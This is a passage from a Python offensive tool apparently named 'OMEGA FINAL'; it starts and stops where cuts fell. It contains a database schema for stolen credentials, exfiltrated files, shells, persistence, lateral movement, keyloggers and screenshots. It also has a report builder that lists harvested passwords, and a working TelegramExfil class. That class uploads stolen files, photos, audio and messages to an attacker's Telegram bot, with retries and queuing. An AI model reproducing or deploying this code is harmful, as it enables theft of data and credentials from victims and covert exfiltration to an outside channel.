    state TEXT DEFAULT 'open',
    version TEXT,
    cpe TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(subdomain_id) REFERENCES subdomains(id)
);
CREATE INDEX IF NOT EXISTS idx_ports_ip ON ports(ip);
CREATE INDEX IF NOT EXISTS idx_ports_port ON ports(port);

CREATE TABLE IF NOT EXISTS technologies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    tech_name TEXT,
    version TEXT,
    confidence REAL,
    category TEXT,
    evidence TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_technologies_tech ON technologies(tech_name);

CREATE TABLE IF NOT EXISTS sqli_vulnerabilities (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    parameter TEXT,
    payload TEXT,
    dbms TEXT,
    response_preview TEXT,
    evidence TEXT,
    risk TEXT DEFAULT 'HIGH',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_sqli_url ON sqli_vulnerabilities(url);

CREATE TABLE IF NOT EXISTS lfi_vulnerabilities (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    parameter TEXT,
    payload TEXT,
    file_read TEXT,
    response_preview TEXT,
    risk TEXT DEFAULT 'HIGH',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_lfi_url ON lfi_vulnerabilities(url);

CREATE TABLE IF NOT EXISTS xss_vulnerabilities (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    parameter TEXT,
    payload TEXT,
    response_preview TEXT,
    type TEXT,
    risk TEXT DEFAULT 'MEDIUM',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_xss_url ON xss_vulnerabilities(url);

CREATE TABLE IF NOT EXISTS command_injection (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    parameter TEXT,
    payload TEXT,
    command_output TEXT,
    risk TEXT DEFAULT 'CRITICAL',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_cmd_url ON command_injection(url);

CREATE TABLE IF NOT EXISTS rce_vulnerabilities (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    parameter TEXT,
    payload TEXT,
    shell_type TEXT,
    shell_url TEXT,
    risk TEXT DEFAULT 'CRITICAL',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_rce_url ON rce_vulnerabilities(url);

CREATE TABLE IF NOT EXISTS cve_vulnerabilities (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cve_id TEXT,
    name TEXT,
    cvss_score REAL,
    target TEXT,
    port INTEGER,
    exploited BOOLEAN DEFAULT 0,
    shell_id INTEGER,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_cve_cve_id ON cve_vulnerabilities(cve_id);

CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    source TEXT,
    credential_type TEXT,
    username TEXT,
    password TEXT,
    url TEXT,
    hash TEXT,
    salt TEXT,
    encrypted BOOLEAN DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_credentials_type ON credentials(credential_type);

CREATE TABLE IF NOT EXISTS files_exfiltrated (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    file_path TEXT,
    file_size INTEGER,
    sha256 TEXT,
    md5 TEXT,
    exfiltrated BOOLEAN DEFAULT 0,
    exfil_method TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_files_path ON files_exfiltrated(file_path);

CREATE TABLE IF NOT EXISTS waf_detections (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    waf_name TEXT,
    confidence REAL,
    headers TEXT,
    fingerprint TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_waf_name ON waf_detections(waf_name);

CREATE TABLE IF NOT EXISTS honeypots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    port INTEGER,
    honeypot_type TEXT,
    confidence REAL,
    banner TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_honeypots_ip ON honeypots(ip);

CREATE TABLE IF NOT EXISTS apis (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT,
    api_type TEXT,
    endpoint TEXT,
    method TEXT,
    parameters TEXT,
    auth_required BOOLEAN DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_apis_url ON apis(url);

CREATE TABLE IF NOT EXISTS cloud_metadata (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    provider TEXT,
    endpoint TEXT,
    data TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_cloud_provider ON cloud_metadata(provider);

CREATE TABLE IF NOT EXISTS shells (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    port INTEGER,
    shell_type TEXT,
    shell_url TEXT,
    active BOOLEAN DEFAULT 1,
    last_heartbeat DATETIME,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_shells_target ON shells(target);

CREATE TABLE IF NOT EXISTS persistence (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    method TEXT,
    location TEXT,
    active BOOLEAN DEFAULT 1,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_persistence_target ON persistence(target);

CREATE TABLE IF NOT EXISTS lateral_movement (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    source TEXT,
    target TEXT,
    method TEXT,
    port INTEGER,
    success BOOLEAN DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_lateral_target ON lateral_movement(target);

CREATE TABLE IF NOT EXISTS network_hosts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    mac TEXT,
    hostname TEXT,
    os TEXT,
    open_ports TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_network_ip ON network_hosts(ip);

CREATE TABLE IF NOT EXISTS keyloggers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    pid INTEGER,
    active BOOLEAN DEFAULT 1,
    key_count INTEGER DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_keylogger_target ON keyloggers(target);

CREATE TABLE IF NOT EXISTS screenshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    screenshot_path TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_screenshot_target ON screenshots(target);

CREATE TABLE IF NOT EXISTS system_info (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT,
    os_name TEXT,
    os_version TEXT,
    kernel TEXT,
    architecture TEXT,
    cpu_count INTEGER,
    memory_total INTEGER,
    disk_used INTEGER,
    disk_free INTEGER,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_system_target ON system_info(target);

CREATE TABLE IF NOT EXISTS checkpoints (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phase INTEGER,
    step TEXT,
    target TEXT,
    data TEXT,
    checksum TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_checkpoints_phase ON checkpoints(phase);
CREATE INDEX IF NOT EXISTS idx_checkpoints_checksum ON checkpoints(checksum);

CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level TEXT,
    message TEXT,
    correlation_id TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_logs_level ON logs(level);
CREATE INDEX IF NOT EXISTS idx_logs_correlation ON logs(correlation_id);

CREATE TABLE IF NOT EXISTS performance (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phase INTEGER,
    step TEXT,
    duration REAL,
    targets_processed INTEGER,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_performance_phase ON performance(phase);

CREATE TABLE IF NOT EXISTS metrics (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    value REAL,
    tags TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_metrics_name ON metrics(name);
CREATE INDEX IF NOT EXISTS idx_metrics_timestamp ON metrics(timestamp);
"""

# ===================================================================
# RECONRESULT DATACLASS - COMPLETE RESULTS CONTAINER
# ===================================================================
@dataclass
class ReconResult:
    """Complete container for Phase 1 reconnaissance results with enhanced methods"""

    subdomains: List[Dict[str, Any]] = field(default_factory=list)
    ports: List[Dict[str, Any]] = field(default_factory=list)
    technologies: List[Dict[str, Any]] = field(default_factory=list)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    exfiltrated_files: List[Dict[str, Any]] = field(default_factory=list)
    credentials: List[Dict[str, Any]] = field(default_factory=list)
    waf_detections: List[Dict[str, Any]] = field(default_factory=list)
    honeypots: List[Dict[str, Any]] = field(default_factory=list)
    apis: List[Dict[str, Any]] = field(default_factory=list)
    cves: List[Dict[str, Any]] = field(default_factory=list)
    shells: List[Dict[str, Any]] = field(default_factory=list)
    persistence: List[Dict[str, Any]] = field(default_factory=list)
    lateral: List[Dict[str, Any]] = field(default_factory=list)
    keyloggers: List[Dict[str, Any]] = field(default_factory=list)
    screenshots: List[Dict[str, Any]] = field(default_factory=list)
    cloud_metadata: List[Dict[str, Any]] = field(default_factory=list)
    command_injections: List[Dict[str, Any]] = field(default_factory=list)
    rces: List[Dict[str, Any]] = field(default_factory=list)
    summary: Dict[str, Any] = field(default_factory=dict)
    _lock: threading.RLock = field(default_factory=threading.RLock, init=False, repr=False)

    def to_dict(self) -> Dict[str, Any]:
        with self._lock:
            def convert(obj: Any) -> Any:
                if isinstance(obj, dict):
                    return {k: convert(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [convert(item) for item in obj]
                elif isinstance(obj, Path):
                    return str(obj)
                elif isinstance(obj, datetime.datetime):
                    return obj.isoformat()
                elif isinstance(obj, Enum):
                    return obj.value
                elif hasattr(obj, '__dict__'):
                    return convert(obj.__dict__)
                return obj

            result: Dict[str, Any] = {}
            for field_name in self.__dataclass_fields__:
                if field_name != '_lock':
                    value = getattr(self, field_name)
                    result[field_name] = convert(value)
            return result

    def to_json(self, indent: int = 2, sort_keys: bool = False) -> str:
        return json.dumps(self.to_dict(), indent=indent, sort_keys=sort_keys, default=str)

    def to_html(self) -> str:
        summary = self.summary or {}
        html_parts = [
            '<!DOCTYPE html><html><head><title>OMEGA FINAL - Recon Report</title><style>',
            'body{font-family:monospace;background:#1a1a2e;color:#eee;padding:20px;max-width:1200px;margin:0 auto}',
            'h1{color:#e94560;border-bottom:2px solid #e94560;padding-bottom:10px}',
            'h2{color:#f5a623;margin-top:20px}.summary{background:#16213e;padding:15px;border-radius:8px;margin:10px 0}',
            '.vuln{background:#0f3460;padding:10px;border-left:4px solid #e94560;margin:5px 0}',
            '.cred{background:#0f3460;padding:10px;border-left:4px solid #f5a623;margin:5px 0}',
            '.file{background:#0f3460;padding:10px;border-left:4px solid #4caf50;margin:5px 0}',
            'table{width:100%;border-collapse:collapse;margin:10px 0}',
            'th,td{border:1px solid #333;padding:8px;text-align:left}',
            'th{background:#2a2a4a;color:#eee}td{background:#1a1a2e}',
            '.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:12px}',
            '.critical{background:#e94560;color:white}.high{background:#f5a623;color:black}',
            '.medium{background:#f7dc6f;color:black}.low{background:#4caf50;color:white}',
            '.section{margin:20px 0}.timestamp{color:#666;font-size:12px}',
            '</style></head><body>',
            f'<h1>🔍 OMEGA FINAL - Phase 1 Reconnaissance Report</h1>',
            f'<p><strong>Scan ID:</strong> {summary.get("scan_id", TIMESTAMP)}</p>',
            f'<p><strong>Generated:</strong> {datetime.datetime.now().isoformat()}</p>',
            f'<p><strong>Targets:</strong> {summary.get("targets", "N/A")}</p>',
            '<div class="summary"><h2>📊 Summary</h2><table>',
            f'<tr><td>Subdomains:</td><td>{len(self.subdomains)}</td></tr>',
            f'<tr><td>Open ports:</td><td>{len(self.ports)}</td></tr>',
            f'<tr><td>Technologies:</td><td>{len(self.technologies)}</td></tr>',
            f'<tr><td>Vulnerabilities:</td><td>{len(self.vulnerabilities)}</td></tr>',
            f'<tr><td>Credentials:</td><td>{len(self.credentials)}</td></tr>',
            f'<tr><td>WAFs:</td><td>{len(self.waf_detections)}</td></tr>',
            f'<tr><td>Honeypots:</td><td>{len(self.honeypots)}</td></tr>',
            f'<tr><td>APIs:</td><td>{len(self.apis)}</td></tr>',
            f'<tr><td>CVEs:</td><td>{len(self.cves)}</td></tr>',
            f'<tr><td>Shells:</td><td>{len(self.shells)}</td></tr>',
            f'<tr><td>Exfiltrated:</td><td>{len(self.exfiltrated_files)}</td></tr>',
            f'<tr><td>Elapsed:</td><td>{summary.get("elapsed_seconds", 0):.1f}s</td></tr>',
            '</table></div>'
        ]

        if self.vulnerabilities:
            html_parts.append('<div class="section"><h2>🐛 Vulnerabilities</h2>')
            for v in self.vulnerabilities[:100]:
                risk = v.get('risk', 'UNKNOWN').lower()
                badge_class = risk if risk in ['critical', 'high', 'medium', 'low'] else 'medium'
                html_parts.append(
                    f'<div class="vuln"><span class="badge {badge_class}">{v.get("type", "UNKNOWN")}</span> '
                    f'<strong>{v.get("url", "N/A")}</strong><br>'
                    f'Payload: <code>{v.get("payload", "N/A")[:100]}</code><br>'
                    f'<span class="timestamp">Risk: {v.get("risk", "UNKNOWN")}</span></div>'
                )
            html_parts.append('</div>')

        if self.credentials:
            html_parts.append('<div class="section"><h2>🔑 Credentials</h2>')
            for c in self.credentials[:50]:
                html_parts.append(
                    f'<div class="cred"><strong>{c.get("credential_type", "UNKNOWN")}</strong> - '
                    f'{c.get("username", "")}:{c.get("password", "")[:20]}...<br>'
                    f'Source: {c.get("source", "N/A")}</div>'
                )
            html_parts.append('</div>')

        if self.exfiltrated_files:
            html_parts.append('<div class="section"><h2>📁 Exfiltrated Files</h2>')
            for f in self.exfiltrated_files[:50]:
                html_parts.append(
                    f'<div class="file"><strong>{f.get("file", "UNKNOWN")}</strong> - {f.get("url", "N/A")}<br>'
                    f'Size: {f.get("size", 0)} bytes</div>'
                )
            html_parts.append('</div>')

        html_parts.append('</body></html>')
        return '\n'.join(html_parts)

    def to_csv(self) -> str:
        output = []
        if self.vulnerabilities:
            output.append('=== VULNERABILITIES ===')
            output.append('type,url,parameter,payload,risk')
            for v in self.vulnerabilities:
                output.append(f"{v.get('type','')},{v.get('url','')},{v.get('parameter','')},{v.get('payload','')[:100]},{v.get('risk','')}")
            output.append('')
        if self.credentials:
            output.append('=== CREDENTIALS ===')
            output.append('source,type,username,password,url')
            for c in self.credentials:
                output.append(f"{c.get('source','')},{c.get('credential_type','')},{c.get('username','')},{c.get('password','')[:50]},{c.get('url','')}")
            output.append('')
        if self.ports:
            output.append('=== PORTS ===')
            output.append('ip,port,service,banner,state')
            for p in self.ports:
                output.append(f"{p.get('ip','')},{p.get('port','')},{p.get('service','')},{p.get('banner','')[:100]},{p.get('state','')}")
            output.append('')
        return '\n'.join(output)

    def count(self) -> Dict[str, int]:
        with self._lock:
            return {
                'subdomains': len(self.subdomains),
                'ports': len(self.ports),
                'technologies': len(self.technologies),
                'vulnerabilities': len(self.vulnerabilities),
                'exfiltrated_files': len(self.exfiltrated_files),
                'credentials': len(self.credentials),
                'waf_detections': len(self.waf_detections),
                'honeypots': len(self.honeypots),
                'apis': len(self.apis),
                'cves': len(self.cves),
                'shells': len(self.shells),
                'persistence': len(self.persistence),
                'lateral': len(self.lateral),
                'keyloggers': len(self.keyloggers),
                'screenshots': len(self.screenshots),
                'cloud_metadata': len(self.cloud_metadata),
                'command_injections': len(self.command_injections),
                'rces': len(self.rces)
            }

    def merge(self, other: 'ReconResult') -> 'ReconResult':
        with self._lock:
            other_dict = other.to_dict()
            for key, value in other_dict.items():
                if key == 'summary':
                    self.summary.update(value)
                elif key != '_lock' and isinstance(value, list):
                    current = getattr(self, key, [])
                    if isinstance(current, list):
                        setattr(self, key, current + value)
        return self

# ===================================================================
# LOGGER CLASS - COMPLETE LOGGING SYSTEM
# ===================================================================
class Logger:
    """Complete logging system with structured JSON logging, correlation IDs, color-coded output, and console buffer."""

    def __init__(self, log_dir: Path, log_level: str = 'DEBUG', max_size: int = 10 * 1024 * 1024, correlation_id: Optional[str] = None):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.log_file = self.log_dir / f"recon_{TIMESTAMP}.log"
        self.error_file = self.log_dir / f"errors_{TIMESTAMP}.log"
        self.json_file = self.log_dir / f"recon_{TIMESTAMP}.jsonl"
        self.console_buffer: List[Tuple[str, str, float]] = []
        self.max_size = max_size
        self.correlation_id = correlation_id or f"scan_{PID}_{TIMESTAMP}"
        self._lock = threading.RLock()
        self._setup_logging(log_level)

    def _setup_logging(self, log_level: str = 'DEBUG') -> None:
        level_map = {'DEBUG': logging.DEBUG, 'INFO': logging.INFO, 'WARNING': logging.WARNING, 'ERROR': logging.ERROR, 'CRITICAL': logging.CRITICAL}
        log_level_value = level_map.get(log_level.upper(), logging.DEBUG)
        self.logger = logging.getLogger('ReconPhase1')
        self.logger.setLevel(log_level_value)
        self.logger.handlers.clear()

        file_handler = logging.FileHandler(self.log_file)
        file_handler.setLevel(log_level_value)
        file_handler.setFormatter(logging.Formatter('[%(asctime)s] [%(levelname)s] [%(threadName)s] [%(correlation_id)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
        file_handler.addFilter(lambda record: setattr(record, 'correlation_id', self.correlation_id) or True)

        error_handler = logging.FileHandler(self.error_file)
        error_handler.setLevel(logging.ERROR)
        error_handler.setFormatter(logging.Formatter('[%(asctime)s] [%(levelname)s] [%(correlation_id)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))

        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(log_level_value)
        class ColorFormatter(logging.Formatter):
            def format(self, record):
                level_colors = {'DEBUG': '\033[90m', 'INFO': '\033[92m', 'WARNING': '\033[93m', 'ERROR': '\033[91m', 'CRITICAL': '\033[41m\033[97m'}
                color = level_colors.get(record.levelname, '\033[0m')
                reset = '\033[0m'
                formatted = super().format(record)
                return f"{color}{formatted}{reset}"
        console_handler.setFormatter(ColorFormatter('[%(asctime)s] %(levelname)s: %(message)s', datefmt='%H:%M:%S'))

        json_handler = logging.FileHandler(self.json_file)
        json_handler.setLevel(log_level_value)
        class JSONFormatter(logging.Formatter):
            def format(self, record):
                return json.dumps({'timestamp': self.formatTime(record), 'level': record.levelname, 'message': record.getMessage(), 'correlation_id': getattr(record, 'correlation_id', 'unknown'), 'thread': record.threadName, 'module': record.module, 'function': record.funcName, 'line': record.lineno}) + '\n'
        json_handler.setFormatter(JSONFormatter())

        self.logger.addHandler(file_handler)
        self.logger.addHandler(error_handler)
        self.logger.addHandler(console_handler)
        self.logger.addHandler(json_handler)

    def _log(self, level: str, message: str, *args: Any, **kwargs: Any) -> None:
        with self._lock:
            full_message = message.format(*args, **kwargs) if args else message
            if full_message:
                log_method = getattr(self.logger, level.lower())
                extra = {'correlation_id': self.correlation_id}
                log_method(full_message, extra=extra)
                self.console_buffer.append((level, full_message, time.time()))

    def info(self, message: str, *args: Any, **kwargs: Any) -> None:
        self._log('INFO', message, *args, **kwargs)
    def warning(self, message: str, *args: Any, **kwargs: Any) -> None:
        self._log('WARNING', message, *args, **kwargs)
    def error(self, message: str, *args: Any, **kwargs: Any) -> None:
        self._log('ERROR', message, *args, **kwargs)
    def debug(self, message: str, *args: Any, **kwargs: Any) -> None:
        self._log('DEBUG', message, *args, **kwargs)
    def critical(self, message: str, *args: Any, **kwargs: Any) -> None:
        self._log('CRITICAL', message, *args, **kwargs)
    def exception(self, message: str, *args: Any, **kwargs: Any) -> None:
        with self._lock:
            full_message = message.format(*args, **kwargs) if args else message
            self.logger.exception(full_message, extra={'correlation_id': self.correlation_id})
            self.console_buffer.append(('ERROR', f"{full_message} - {traceback.format_exc()}", time.time()))

    def get_console_log(self, limit: int = 100) -> List[str]:
        with self._lock:
            return [f"[{msg[0]}] {msg[1]}" for msg in self.console_buffer[-limit:]]

    def save_console_log(self, filename: Optional[Path] = None) -> None:
        if not filename:
            filename = self.log_dir / f"console_{TIMESTAMP}.log"
        with open(filename, 'w') as f:
            for level, msg, ts in self.console_buffer:
                f.write(f"[{datetime.datetime.fromtimestamp(ts).isoformat()}] [{level}] {msg}\n")

    def get_correlation_id(self) -> str:
        return self.correlation_id

# ===================================================================
# TELEGRAM EXFILTRATION CLASS - COMPLETE TELEGRAM INTEGRATION
# ===================================================================
class TelegramExfil:
    """Complete Telegram exfiltration with rate limiting, retries, fallback, and priority queuing."""

    def __init__(self, token: str, chat_id: str, fallback_file: Optional[Path] = None, rate_per_second: float = 20.0, max_queue_size: int = 10000):
        self.token = token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{token}"
        self.fallback_file = Path(fallback_file) if fallback_file else TELEGRAM_FALLBACK
        self.fallback_file.parent.mkdir(parents=True, exist_ok=True)
        self.session: Optional[requests.Session] = None
        self.message_queue: queue.PriorityQueue = queue.PriorityQueue(maxsize=max_queue_size)
        self.sending_thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
        self.rate_limiter = RateLimiter(rate_per_second, 1.0)
        self._lock = threading.RLock()
        self._sent_count = 0
        self._failed_count = 0
        self._queue_size = 0
        self._last_message_id: Optional[int] = None

        if REQUESTS_AVAILABLE:
            self.session = requests.Session()
            retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
            adapter = HTTPAdapter(max_retries=retries, pool_connections=20, pool_maxsize=20)
            self.session.mount('http://', adapter)
            self.session.mount('https://', adapter)
            self.session.timeout = 30

        self._start_sender_thread()

    def _start_sender_thread(self) -> None:
        if not self.sending_thread or not self.sending_thread.is_alive():
            self.stop_event.clear()
            self.sending_thread = threading.Thread(target=self._sender_loop, daemon=True, name="TelegramSender")
            self.sending_thread.start()

    def _sender_loop(self) -> None:
        while not self.stop_event.is_set():
            try:
                priority, item = self.message_queue.get(timeout=1)
                if item is None:
                    break
                method, args, kwargs = item
                self._send_with_retry(method, args, kwargs)
                self.message_queue.task_done()
                with self._lock:
                    self._queue_size = self.message_queue.qsize()
            except queue.Empty:
                continue
            except Exception as e:
                with self._lock:
                    self._failed_count += 1

    def _send_with_retry(self, method: str, args: tuple, kwargs: dict) -> bool:
        for attempt in range(MAX_RETRIES):
            try:
                self.rate_limiter.wait_and_acquire()
                if method == 'send_message':
                    result = self._send_message(*args, **kwargs)
                elif method == 'send_document':
                    result = self._send_document(*args, **kwargs)
                elif method == 'send_photo':
                    result = self._send_photo(*args, **kwargs)
                elif method == 'send_video':
                    result = self._send_video(*args, **kwargs)
                elif method == 'send_audio':
                    result = self._send_audio(*args, **kwargs)
                elif method == 'send_album':
                    result = self._send_album(*args, **kwargs)
                elif method == 'alert':
                    result = self._alert(*args, **kwargs)
                else:
                    return False
                if result:
                    with self._lock:
                        self._sent_count += 1
                    return True
                else:
                    with self._lock:
                        self._failed_count += 1
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(BACKOFF_FACTOR ** attempt)
            except Exception as e:
                with self._lock:
                    self._failed_count += 1
                if attempt < MAX_RETRIES - 1:
                    time.sleep(BACKOFF_FACTOR ** attempt)
        self._write_fallback(method, args, kwargs)
        return False

    def _write_fallback(self, method: str, args: tuple, kwargs: dict) -> None:
        try:
            with open(self.fallback_file, 'a') as f:
                f.write(f"[{datetime.datetime.now().isoformat()}] {method}: {str(args)[:200]} {str(kwargs)[:200]}\n")
        except Exception:
            pass

    def _send_message(self, text: str, parse_mode: str = 'HTML') -> bool:
        if not self.token or not self.chat_id:
            return False
        try:
            chunks = [text[i:i+4096] for i in range(0, len(text), 4096)]
            for chunk in chunks:
                if self.session:
                    resp = self.session.post(f"{self.api_url}/sendMessage", json={'chat_id': self.chat_id, 'text': chunk, 'parse_mode': parse_mode, 'disable_web_page_preview': True})
                    if resp.status_code != 200:
                        return False
                    try:
                        self._last_message_id = resp.json().get('result', {}).get('message_id')
                    except Exception:
                        pass
                else:
                    data = urllib.parse.urlencode({'chat_id': self.chat_id, 'text': chunk, 'parse_mode': parse_mode, 'disable_web_page_preview': True}).encode()
                    req = urllib.request.Request(f"{self.api_url}/sendMessage", data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
                    resp = urllib.request.urlopen(req, timeout=30)
                    if resp.status != 200:
                        return False
            return True
        except Exception as e:
            return False

    def _send_document(self, file_path: Path, caption: str = "") -> bool:
        if not self.token or not self.chat_id:
            return False
        try:
            if not file_path.exists():
                return False
            if file_path.stat().st_size > 50 * 1024 * 1024:
                return False
            with open(file_path, 'rb') as f:
                files = {'document': (file_path.name, f)}
                data = {'chat_id': self.chat_id, 'caption': caption[:1024]}
                if self.session:
                    resp = self.session.post(f"{self.api_url}/sendDocument", files=files, data=data, timeout=60)
                    return resp.status_code == 200
                return False
        except Exception as e:
            return False

    def _send_photo(self, file_path: Path, caption: str = "") -> bool:
        if not self.token or not self.chat_id:
            return False
        try:
            if not file_path.exists():
                return False
            with open(file_path, 'rb') as f:
                files = {'photo': (file_path.name, f)}
                data = {'chat_id': self.chat_id, 'caption': caption[:1024]}
                if self.session:
                    resp = self.session.post(f"{self.api_url}/sendPhoto", files=files, data=data, timeout=60)
                    return resp.status_code == 200
                return False
        except Exception as e:
            return False

    def _send_video(self, file_path: Path, caption: str = "") -> bool:
        if not self.token or not self.chat_id:
            return False
        try:
            if not file_path.exists():
                return False
            with open(file_path, 'rb') as f:
                files = {'video': (file_path.name, f)}
                data = {'chat_id': self.chat_id, 'caption': caption[:1024]}
                if self.session:
                    resp = self.session.post(f"{self.api_url}/sendVideo", files=files, data=data, timeout=60)
                    return resp.status_code == 200
                return False
        except Exception as e:
            return False

    def _send_audio(self, file_path: Path, caption: str = "") -> bool:
        if not self.token or not self.chat_id:
            return False
        try:
            if not file_path.exists():
                return False
            with open(file_path, 'rb') as f:
                files = {'audio': (file_path.name, f)}
                data = {'chat_id': self.chat_id, 'caption': caption[:1024]}
                if self.session:
                    resp = self.session.post(f"{self.api_url}/sendAudio", files=files, data=data, timeout=60)
                    return resp.status_code == 200
                return False
        except Exception as e:
            return False

    def _send_album(self, file_paths: List[Path], caption: str = "") -> bool:
        if not self.token or not self.chat_id:
            return False
        try:
            media = []
            for fp in file_paths[:10]:
                if fp.exists():
                    with open(fp, 'rb') as f:
                        media.append({'type': 'document', 'media': f.read(), 'caption': caption if len(media) == 0 else ''})
            if not media:
                return False
            if self.session:
                files = []
                for i, m in enumerate(media):
                    files.append(('media', (f'file_{i}', m['media'])))
                data = {'chat_id': self.chat_id, 'media': json.dumps([{'type': 'document', 'media': f'file_{i}'} for i in range(len(media))])}
                resp = self.session.post(f"{self.api_url}/sendMediaGroup", files=files, data=data, timeout=60)
                return resp.status_code == 200
            return False
        except Exception as e:
            return False

    def _alert(self, title: str, message: str, severity: str = "INFO", code: str = None) -> bool:
        emoji_map = {'INFO': 'ℹ️', 'WARNING': '⚠️', 'HIGH': '🔥', 'CRITICAL': '🚨', 'DANGER': '💀', 'SUCCESS': '✅', 'ERROR': '❌'}
        emoji = emoji_map.get(severity.upper(), 'ℹ️')
        text = f"{emoji} <b>{title}</b>\n{message}"
        if code:
            text += f"\n<pre>{code[:500]}</pre>"
        return self._send_message(text)

    def send_message(self, text: str, parse_mode: str = 'HTML', priority: int = TaskPriority.NORMAL) -> bool:
        self.message_queue.put((priority, ('send_message', (text, parse_mode), {})))
        return True

    def send_document(self, file_path: Path, caption: str = "", priority: int = TaskPriority.NORMAL) -> bool:
        self.message_queue.put((priority, ('send_document', (file_path, caption), {})))
        return True

    def send_photo(self, file_path: Path, caption: str = "", priority: int = TaskPriority.NORMAL) -> bool:
        self.message_queue.put((priority, ('send_photo', (file_path, caption), {})))
        return True

    def send_video(self, file_path: Path, caption: str = "", priority: int = TaskPriority.NORMAL) -> bool:
        self.message_queue.put((priority, ('send_video', (file_path, caption), {})))
        return True

    def send_audio(self, file_path: Path, caption: str = "", priority: int = TaskPriority.NORMAL) -> bool:
        self.message_queue.put((priority, ('send_audio', (file_path, caption), {})))
        return True

    def send_album(self, file_paths: List[Path], caption: str = "", priority: int = TaskPriority.NORMAL) -> bool:
        self.message_queue.put((priority, ('send_album', (file_paths, caption), {})))
        return True

    def alert(self, title: str, message: str, severity: str = "INFO", code: str = None, priority: int = TaskPriority.HIGH) -> bool:
        self.message_queue.put((priority, ('alert', (title, message, severity, code), {})))
        return True

    def flush(self) -> None:
        self.message_queue.join()

    def close(self) -> None:
        self.stop_event.set()
        self.message_queue.put((0, None))
        if self.sending_thread:
